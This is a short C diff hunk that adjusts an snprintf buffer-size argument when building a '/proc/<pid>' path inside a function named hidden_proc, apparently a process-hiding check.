@@ -105,7 +105,7 @@ int hidden_proc(pid_t pid){
 #else
     char proc_path[32 + PID_MAXLEN];
     memset(proc_path, 0, sizeof(proc_path));
-    snprintf(proc_path, sizeof(proc_path)-1, "/proc/%d", pid);
+    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
     return _hidden_path(proc_path, MODE_REG);
 #endif
 }
